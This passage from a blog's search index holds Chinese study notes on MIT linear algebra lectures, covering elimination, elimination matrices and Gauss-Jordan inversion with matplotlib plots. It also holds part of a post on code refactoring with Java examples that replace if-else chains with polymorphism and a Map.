2&amp;7&amp;0&amp;1\end{array}\right]$，接下来用消元法将左侧变为单位矩阵；</li><li>$\left[\begin{array}{cc|cc}1&amp;3&amp;1&amp;0\newline 2&amp;7&amp;0&amp;1\end{array}\right]\xrightarrow{row_2-2row_1}\left[\begin{array}{cc|cc}1&amp;3&amp;1&amp;0\newline 0&amp;1&amp;-2&amp;1\end{array}\right]\xrightarrow{row_1-3row_2}\left[\begin{array}{cc|cc}1&amp;0&amp;7&amp;-3\newline 0&amp;1&amp;-2&amp;1\end{array}\right]$</li><li>于是，我们就将矩阵从$\left[\begin{array}{c|c}A&amp;I\end{array}\right]$变为$\left[\begin{array}{c|c}I&amp;A^{-1}\end{array}\right]$</li></ol><p>而高斯-若尔当法的本质是使用消元矩阵$E$，对$A$进行操作，$E\left[\begin{array}{c|c}A&amp;I\end{array}\right]$，利用一步步消元有$EA=I$，进而得到$\left[\begin{array}{c|c}I&amp;E\end{array}\right]$，其实这个消元矩阵$E$就是$A^{-1}$，而高斯-若尔当法中的$I$只是负责记录消元的每一步操作，待消元完成，逆矩阵就自然出现了。</p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinearAlgebra </tag>
            
            <tag> MIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linear Algebra Review 02</title>
      <link href="/2020/04/18/Linear-Algebra-Review-02/"/>
      <url>/2020/04/18/Linear-Algebra-Review-02/</url>
      
        <content type="html"><![CDATA[<h2 id="第二讲：矩阵消元"><a href="#第二讲：矩阵消元" class="headerlink" title="第二讲：矩阵消元"></a>第二讲：矩阵消元</h2><p>这个方法最早由高斯提出，我们以前解方程组的时候都会使用，现在来看如何使用矩阵实现消元法。</p><h3 id="消元法"><a href="#消元法" class="headerlink" title="消元法"></a>消元法</h3><p>有三元方程组$\begin{cases}x&amp;+2y&amp;+z&amp;=2\newline 3x&amp;+8y&amp;+z&amp;=12\newline &amp;4y&amp;+z&amp;=2\end{cases}$，对应的矩阵形式$Ax=b$为$\begin{bmatrix}1&amp;2&amp;1\newline 3&amp;8&amp;1\newline 0&amp;4&amp;1\end{bmatrix}\begin{bmatrix}x\newline y\newline z\end{bmatrix}=\begin{bmatrix}2\newline 12\newline 2\end{bmatrix}$<br>按照我们以前做消元法的思路：</p><ul><li>第一步，我们希望在第二个方程中消去$x$项，来操作系数矩阵$A=\begin{bmatrix}\underline{1}&amp;2&amp;1\newline 3&amp;8&amp;1\newline 0&amp;4&amp;1\end{bmatrix}$，下划线的元素为第一步的主元（pivot）：$\begin{bmatrix}\underline{1}&amp;2&amp;1\newline 3&amp;8&amp;1\newline 0&amp;4&amp;1\end{bmatrix}\xrightarrow{row_2-3row_1}\begin{bmatrix}\underline{1}&amp;2&amp;1\newline 0&amp;2&amp;-2\newline 0&amp;4&amp;1\end{bmatrix}$<br>这里我们先不管$b$向量，等做完$A$的消元可以再做$b$的消元。（这是MATLAB等工具经常使用的算法。）</li><li>第二步，我们希望在第三个方程中消去$y$项，现在第二行第一个非零元素成为了第二个主元：$\begin{bmatrix}\underline{1}&amp;2&amp;1\newline 0&amp;\underline{2}&amp;-2\newline 0&amp;4&amp;1\end{bmatrix}\xrightarrow{row_3-2row_2}\begin{bmatrix}\underline{1}&amp;2&amp;1\newline 0&amp;\underline{2}&amp;-2\newline 0&amp;0&amp;\underline{5}\end{bmatrix}$<br>注意到第三行消元过后仅剩一个非零元素，所以它就成为第三个主元。做到这里就算消元完成了。</li></ul><p>再来讨论一下消元失效的情形：首先，主元不能为零；其次，如果在消元时遇到主元位置为零，则需要交换行，使主元不为零；最后提一下，如果我们把第三个方程$z$前的系数成$-4$，会导致第二步消元时最后一行全部为零，则第三个主元就不存在了，至此消元不能继续进行了，这就是下一讲中涉及的不可逆情况。</p><ul><li>接下来就该回代（back substitution）了，这时我们在$A$矩阵后面加上$b$向量写成增广矩阵（augmented matrix）的形式：$\left[\begin{array}{c|c}A&amp;b\end{array}\right]=\left[\begin{array}{ccc|c}1&amp;2&amp;1&amp;2\newline 3&amp;8&amp;1&amp;12\newline 0&amp;4&amp;1&amp;2\end{array}\right]\to\left[\begin{array}{ccc|c}1&amp;2&amp;1&amp;2\newline 0&amp;2&amp;-2&amp;6\newline 0&amp;4&amp;1&amp;2\end{array}\right]\to\left[\begin{array}{ccc|c}1&amp;2&amp;1&amp;2\newline 0&amp;2&amp;-2&amp;6\newline 0&amp;0&amp;5&amp;-10\end{array}\right]$</li></ul><p>不难看出，$z$的解已经出现了，此时方程组变为$\begin{cases}x&amp;+2y&amp;+z&amp;=2\newline &amp;2y&amp;-2z&amp;=6\newline &amp;&amp;5z&amp;=-10\end{cases}$，从第三个方程求出$z=-2$，代入第二个方程求出$y=1$，在代入第一个方程求出$x=2$。</p><h3 id="消元矩阵"><a href="#消元矩阵" class="headerlink" title="消元矩阵"></a>消元矩阵</h3><p>上一讲我们学习了矩阵乘以向量的方法，有三个列向量的矩阵乘以另一个向量，按列的线性组合可以写作$\Bigg[v_1\ v_2\ v_3\Bigg]\begin{bmatrix}3\newline 4\newline 5\end{bmatrix}=3v_1+4v_2+5v_3$<br>但现在我们希望用矩阵乘法表示行操作，则有$\begin{bmatrix}1&amp;2&amp;7\end{bmatrix}\begin{bmatrix}&amp;row_1&amp;\newline &amp;row_2&amp;\newline &amp;row_3&amp;\end{bmatrix}=1row_1+2row_2+7row_3$。易看出这里是一个行向量从左边乘以矩阵，这个行向量按行操作矩阵的行向量，并将其合成为一个矩阵行向量的线性组合。<br>介绍到这里，我们就可以将消元法所做的行操作写成向量乘以矩阵的形式了。</p><ul><li><p>消元法第一步操作为将第二行改成$row_2-3row_1$，其余两行不变，则有$\begin{bmatrix}1&amp;0&amp;0\newline -3&amp;1&amp;0\newline 0&amp;0&amp;1\end{bmatrix}\begin{bmatrix}1&amp;2&amp;1\newline 3&amp;8&amp;1\newline 0&amp;4&amp;1\end{bmatrix}=\begin{bmatrix}1&amp;2&amp;1\newline 0&amp;2&amp;-2\newline 0&amp;4&amp;1\end{bmatrix}$（另外，如果三行都不变，消元矩阵就是单位矩阵$I=\begin{bmatrix}1&amp;0&amp;0\newline 0&amp;1&amp;0\newline 0&amp;0&amp;1\end{bmatrix}$，$I$之于矩阵运算相当于$1$之于四则运算。）这个消元矩阵我们记作$E_{21}$，即将第二行第一个元素变为零。</p></li><li><p>接下来就是求$E_{32}$消元矩阵了，即将第三行第二个元素变为零，则$\begin{bmatrix}1&amp;0&amp;0\newline 0&amp;1&amp;0\newline 0&amp;-2&amp;1\end{bmatrix}\begin{bmatrix}1&amp;2&amp;1\newline 0&amp;2&amp;-2\newline 0&amp;4&amp;1\end{bmatrix}=\begin{bmatrix}1&amp;2&amp;1\newline 0&amp;2&amp;-2\newline 0&amp;0&amp;5\end{bmatrix}$。这就是消元所用的两个初等矩阵（elementary matrix）。</p></li><li><p>最后，我们将这两步综合起来，即$E_{32}(E_{12}A)=U$，也就是说如果我们想从$A$矩阵直接得到$U$矩阵的话，只需要$(E_{32}E_{21})A$即可。注意，矩阵乘法虽然不能随意变动相乘次序，但是可以变动括号位置，也就是满足结合律（associative law），而结合律在矩阵运算中非常重要，很多定理的证明都需要巧妙的使用结合律。</p></li></ul><p>既然提到了消元用的初等矩阵，那我们再介绍一种用于置换两行的矩阵：置换矩阵（permutation matrix）<br>例如$\begin{bmatrix}0&amp;1\newline 1&amp;0\end{bmatrix}\begin{bmatrix}a&amp;b\newline c&amp;d\end{bmatrix}=\begin{bmatrix}c&amp;d\newline a&amp;b\end{bmatrix}$，置换矩阵将原矩阵的两行做了互换。顺便提一下，如果我们希望交换两列，则有$\begin{bmatrix}a&amp;b\newline c&amp;d\end{bmatrix}\begin{bmatrix}0&amp;1\newline 1&amp;0\end{bmatrix}=\begin{bmatrix}b&amp;a\newline d&amp;c\end{bmatrix}$。</p><p>我们现在能够将$A$通过行变换写成$U$，那么如何从$U$再变回$A$，也就是求消元的逆运算。对某些“坏”矩阵，并没有逆，而本讲的例子都是“好”矩阵。</p><h3 id="逆"><a href="#逆" class="headerlink" title="逆"></a>逆</h3><p>现在，我们以$E_{21}$为例，$\Bigg[\quad ?\quad \Bigg]\begin{bmatrix}1&amp;0&amp;0\newline -3&amp;1&amp;0\newline 0&amp;0&amp;1\end{bmatrix}=\begin{bmatrix}1&amp;0&amp;0\newline 0&amp;1&amp;0\newline 0&amp;0&amp;1\end{bmatrix}$，什么矩阵可以取消这次行变换？这次变换是从第二行中减去三倍的第一行，那么其逆变换就是给第二行加上三倍的第一行，所以逆矩阵就是$\begin{bmatrix}1&amp;0&amp;0\newline 3&amp;1&amp;0\newline 0&amp;0&amp;1\end{bmatrix}$<br>我们把矩阵$E$的逆记作$E^{-1}$，所以有$E^{-1}E=I$。</p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinearAlgebra </tag>
            
            <tag> MIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linear Algebra Review 01</title>
      <link href="/2020/04/18/Linear-Algebra-Review-01/"/>
      <url>/2020/04/18/Linear-Algebra-Review-01/</url>
      
        <content type="html"><![CDATA[<h2 id="第一讲：方程组的几何解释"><a href="#第一讲：方程组的几何解释" class="headerlink" title="第一讲：方程组的几何解释"></a>第一讲：方程组的几何解释</h2><p>我们从求解线性方程组来开始这门课，从一个普通的例子讲起：方程组有$2$个未知数，一共有$2$个方程，分别来看方程组的“行图像”和“列图像”。</p><p>有方程组$\begin{cases}2x&amp;-y&amp;=0\newline -x&amp;+2y&amp;=3\end{cases}$，写作矩阵形式有$\begin{bmatrix}2&amp;-1\newline -1&amp;2\end{bmatrix}\begin{bmatrix}x\newline y\end{bmatrix}=\begin{bmatrix}0\newline 3\end{bmatrix}$，通常我们把第一个矩阵称为系数矩阵$A$，将第二个矩阵称为向量$x$，将第三个矩阵称为向量$b$，于是线性方程组可以表示为$Ax=b$。</p><p>我们来看行图像，即直角坐标系中的图像：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line">x = [<span class="number">-2</span>, <span class="number">2</span>, <span class="number">-2</span>, <span class="number">2</span>]</span><br><span class="line">y = [<span class="number">-4</span>, <span class="number">4</span>, <span class="number">0.5</span>, <span class="number">2.5</span>]</span><br><span class="line"></span><br><span class="line">fig = plt.figure()</span><br><span class="line">plt.axhline(y=<span class="number">0</span>, c=<span class="string">'black'</span>)</span><br><span class="line">plt.axvline(x=<span class="number">0</span>, c=<span class="string">'black'</span>)</span><br><span class="line"></span><br><span class="line">plt.plot(x[:<span class="number">2</span>], y[:<span class="number">2</span>], x[<span class="number">2</span>:], y[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">plt.draw()</span><br></pre></td></tr></table></figure><p><img src="plot1.png" alt=""></p><p>上图是我们都很熟悉的直角坐标系中两直线相交的情况，接下来我们按列观察方程组$x\begin{bmatrix}2\newline -1\end{bmatrix}+y\begin{bmatrix}-1\newline 2\end{bmatrix}=\begin{bmatrix}0\newline 3\end{bmatrix}$（我们把第一个向量称作$col_1$，第二个向量称作$col_2$，以表示第一列向量和第二列向量），要使得式子成立，需要第一个向量加上两倍的第二个向量，即$1\begin{bmatrix}2\newline -1\end{bmatrix}+2\begin{bmatrix}-1\newline 2\end{bmatrix}=\begin{bmatrix}0\newline 3\end{bmatrix}$。</p><p>现在来看列图像，在二维平面上画出上面的列向量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"></span><br><span class="line">fig = plt.figure()</span><br><span class="line">plt.axhline(y=<span class="number">0</span>, c=<span class="string">'black'</span>)</span><br><span class="line">plt.axvline(x=<span class="number">0</span>, c=<span class="string">'black'</span>)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">ax.set_xlim(<span class="number">-2.5</span>, <span class="number">2.5</span>)</span><br><span class="line">ax.set_ylim(<span class="number">-3</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">arrow_vector = partial(plt.arrow, width=<span class="number">0.01</span>, head_width=<span class="number">0.1</span>, head_length=<span class="number">0.2</span>, length_includes_head=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">arrow_vector(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">-1</span>, color=<span class="string">'g'</span>)</span><br><span class="line">arrow_vector(<span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">2</span>, color=<span class="string">'c'</span>)</span><br><span class="line">arrow_vector(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-2</span>, <span class="number">4</span>, color=<span class="string">'b'</span>)</span><br><span class="line">arrow_vector(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, width=<span class="number">0.05</span>, color=<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">plt.draw()</span><br></pre></td></tr></table></figure><p><img src="plot2.png" alt=""></p><p>如图，绿向量$col_1$与蓝向量（两倍的蓝绿向量$col_2$）合成红向量$b$。</p><p>接着，我们继续观察 $x\begin{bmatrix}2\newline -1\end{bmatrix}+y\begin{bmatrix}-1\newline 2\end{bmatrix}=\begin{bmatrix}0\newline 3\end{bmatrix}$，$col_1,col_2$ 的某种线性组合得到了向量$b$，那么$col_1,col_2$的所有线性组合能够得到什么结果？它们将铺满整个平面。</p><p>下面进入三个未知数的方程组：$\begin{cases}2x&amp;-y&amp;&amp;=0\newline -x&amp;+2y&amp;-z&amp;=-1\newline &amp;-3y&amp;+4z&amp;=4\end{cases}$，写作矩阵形式$A=\begin{bmatrix}2&amp;-1&amp;0\newline -1&amp;2&amp;-1\newline 0&amp;-3&amp;4\end{bmatrix},\ b=\begin{bmatrix}0\newline -1\newline 4\end{bmatrix}$。</p><p>在三维直角坐标系中，每一个方程将确定一个平面，而例子中的三个平面会相交于一点，这个点就是方程组的解。</p><p>同样的，将方程组写成列向量的线性组合，观察列图像：$x\begin{bmatrix}2\newline -1\newline 0\end{bmatrix}+y\begin{bmatrix}-1\newline 2\newline -3\end{bmatrix}+z\begin{bmatrix}0\newline -1\newline 4\end{bmatrix}=\begin{bmatrix}0\newline -1\newline 4\end{bmatrix}$。易知我们需要的线性组合为$x=0,y=0,z=1$。假设我们令$b=\begin{bmatrix}1\newline 1\newline -3\end{bmatrix}$，则需要的线性组合为$x=1,y=1,z=0$。</p><p>我们并不能总是这么轻易的求出正确的线性组合，所以下一讲将介绍消元法——一种线性方程组的系统性解法。</p><p>现在，我们需要考虑，对于任意的$b$，是否都能求解$Ax=b$？用列向量线性组合的观点阐述就是，列向量的线性组合能否覆盖整个三维向量空间？对上面这个例子，答案是肯定的。但是如果三个向量在同一个平面上，问题就出现了——那么他们的线性组合也一定都在这个平面上。举个例子，比如$col_3=col_1+col_2$，那么不管怎么组合，这三个向量的结果都逃不出这个平面，因此当$b$在平面内，方程组有解，而当$b$不在平面内，这三个列向量就无法构造出$b$。这种情形称为<strong>奇异</strong>、<strong>矩阵不可逆</strong>。如果推广到九维空间，即每个方程有九个未知数，共九个方程，那么也是一样的。</p><p>接下来介绍方程的矩阵形式$Ax=b$，这是一种乘法运算，举个例子，取$A=\begin{bmatrix}2&amp;5\newline 1&amp;3\end{bmatrix},\ x=\begin{bmatrix}1\newline 2\end{bmatrix}$，来看如何计算矩阵乘以向量：</p><ul><li>我们依然使用列向量线性组合的方式，一次计算一列，$\begin{bmatrix}2&amp;5\newline 1&amp;3\end{bmatrix}\begin{bmatrix}1\newline 2\end{bmatrix}=1\begin{bmatrix}2\newline 1\end{bmatrix}+2\begin{bmatrix}5\newline 3\end{bmatrix}=\begin{bmatrix}12\newline 7\end{bmatrix}$</li><li>另一种方法，使用向量内积，矩阵第一行向量点乘$x$向量$\begin{bmatrix}2&amp;5\end{bmatrix}\cdot\begin{bmatrix}1&amp;2\end{bmatrix}^T=12,\ \begin{bmatrix}1&amp;3\end{bmatrix}\cdot\begin{bmatrix}1&amp;2\end{bmatrix}^T=7$。</li></ul><p>教授建议使用第一种方法，将$Ax$看做$A$列向量的线性组合。</p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinearAlgebra </tag>
            
            <tag> MIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>What is Code Refactoring and How To Refactor</title>
      <link href="/2020/03/01/What-is-Code-Refactoring-and-How-To-Refactor/"/>
      <url>/2020/03/01/What-is-Code-Refactoring-and-How-To-Refactor/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是重构"><a href="#什么是重构" class="headerlink" title="什么是重构"></a>什么是重构</h2><h3 id="误区与定义"><a href="#误区与定义" class="headerlink" title="误区与定义"></a>误区与定义</h3><p>误区：把任何形式的代码清理当做重构。<br>定义：对软件内部结构的一种调整，目的是在不改变软件可观察行为的前提下，提高其可理解性，降低修改成本。</p><h3 id="软件工程质量"><a href="#软件工程质量" class="headerlink" title="软件工程质量"></a>软件工程质量</h3><p>外部质量</p><ul><li>Functionality(功能性)</li><li>Usability(可用性)</li><li>Reliability(可靠性)</li><li>Performance(性能)</li><li>Supportability/Safety(维护性、安全性)</li></ul><p>内部质量</p><ul><li>代码质量(不可见)</li></ul><h2 id="为何需要重构"><a href="#为何需要重构" class="headerlink" title="为何需要重构"></a>为何需要重构</h2><h3 id="技术债务"><a href="#技术债务" class="headerlink" title="技术债务"></a>技术债务</h3><blockquote><p>开发团队在设计或架构选型时从短期效应的角度选择了一个易于实现的方案，但从长远来看，这种方案会带来消极的影响，亦即开发团队所欠的债务。 ——Ward Cunningham</p></blockquote><h3 id="破窗效应"><a href="#破窗效应" class="headerlink" title="破窗效应"></a>破窗效应</h3><h3 id="重构的收益"><a href="#重构的收益" class="headerlink" title="重构的收益"></a>重构的收益</h3><p>重构改进软件的设计——保持架构活力<br>重构使软件更容易理解——易理解&gt;易维护&gt;高效率<br>重构帮助找到BUG——结构清晰更容易发现问题<br>重构提高编程速度——更快迭代</p><h3 id="重构的挑战"><a href="#重构的挑战" class="headerlink" title="重构的挑战"></a>重构的挑战</h3><ol><li>工期延误：Baby step、长期收益</li><li>破坏功能：单元测试很重要、使用Eclipse的自动化重构工具</li><li>性能下降<br>深奥的代码并不能给编译器提供更好的优化线索<br>影响系统效率的关键通常只在10%的代码上<br>调优一段整洁的代码，比调优一段“被优化过”的代码容易的多</li></ol><h2 id="Java-中如何减少-if-else-嵌套"><a href="#Java-中如何减少-if-else-嵌套" class="headerlink" title="Java 中如何减少 if-else 嵌套"></a>Java 中如何减少 if-else 嵌套</h2><p>场景：</p><ol><li>异常逻辑处理：只能一个分支是正常流程</li><li>不同状态处理：所有分支都是正常流程</li></ol><h3 id="接口分层"><a href="#接口分层" class="headerlink" title="接口分层"></a>接口分层</h3><p>把接口分为外部和内部接口，所有空值判断放在外部接口完成；而内部接口传入的变量由外部接口保证不为空，从而减少空值判断。</p><h3 id="利用多态"><a href="#利用多态" class="headerlink" title="利用多态"></a>利用多态</h3><p>利用多态，把业务判断消除，各子类分别关注自己的实现，并实现子类的创建方法，避免用户了解过多的类。<br>但使用多态对原来代码修改过大，最好在设计之初就使用多态方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重构前</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TYPE_LINK = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TYPE_IMAGE = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TYPE_TEXT = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TYPE_IMAGE_TEXT = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShareItem</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> type;</span><br><span class="line">    String title;</span><br><span class="line">    String content;</span><br><span class="line">    String imagePath;</span><br><span class="line">    String link;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ShareListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> STATE_SUCC = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> STATE_FAIL = <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onCallback</span><span class="params">(<span class="keyword">int</span> state, String msg)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">share</span><span class="params">(ShareItem item, ShareListener listener)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">    shareImpl(item, listener);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">shareImpl</span> <span class="params">(ShareItem item, ShareListener listener)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (item.type == TYPE_LINK) &#123;</span><br><span class="line">        <span class="comment">// 分享链接</span></span><br><span class="line">        <span class="keyword">if</span> (!TextUtils.isEmpty(item.link) &amp;&amp; !TextUtils.isEmpty(item.title)) &#123;</span><br><span class="line">            doShareLink(item.link, item.title, item.content, listener);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            listener.onCallback(ShareListener.STATE_FAIL, <span class="string">"分享信息不完整"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (item.type == TYPE_IMAGE) &#123;</span><br><span class="line">        <span class="comment">// 分享图片</span></span><br><span class="line">        <span class="keyword">if</span> (!TextUtils.isEmpty(item.imagePath)) &#123;</span><br><span class="line">            doShareImage(item.imagePath, listener);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            listener.onCallback(ShareListener.STATE_FAIL, <span class="string">"分享信息不完整"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        listener.onCallback(ShareListener.STATE_FAIL, <span class="string">"不支持的分享类型"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重构后</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ShareItem</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> type;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ShareItem</span><span class="params">(<span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">doShare</span><span class="params">(ShareListener listener)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Link</span> <span class="keyword">extends</span> <span class="title">ShareItem</span> </span>&#123;</span><br><span class="line">    String title;</span><br><span class="line">    String content;</span><br><span class="line">    String link;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Link</span><span class="params">(String link, String title, String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(TYPE_LINK);</span><br><span class="line">        <span class="keyword">this</span>.link = !TextUtils.isEmpty(link) ? link : <span class="string">"default"</span>;</span><br><span class="line">        <span class="keyword">this</span>.title = !TextUtils.isEmpty(title) ? title : <span class="string">"default"</span>;</span><br><span class="line">        <span class="keyword">this</span>.content = !TextUtils.isEmpty(content) ? content : <span class="string">"default"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doShare</span><span class="params">(ShareListener listener)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// do share</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Image</span> <span class="keyword">extends</span> <span class="title">ShareItem</span> </span>&#123;</span><br><span class="line">    String imagePath;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Image</span><span class="params">(String imagePath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(TYPE_IMAGE);</span><br><span class="line">        <span class="keyword">this</span>.imagePath = !TextUtils.isEmpty(imagePath) ? imagePath : <span class="string">"default"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doShare</span><span class="params">(ShareListener listener)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// do share</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">share</span><span class="params">(ShareItem item, ShareListener listener)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">    shareImpl(item, listener);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">shareImpl</span> <span class="params">(ShareItem item, ShareListener listener)</span> </span>&#123;</span><br><span class="line">    item.doShare(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Map分支"><a href="#Map分支" class="headerlink" title="Map分支"></a>Map分支</h3><p>把分支状态信息预先缓存在Map里，直接get获取具体值，消除分支。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;Integer, Class&lt;? extends ShareItem&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    map.put(TYPE_LINK, 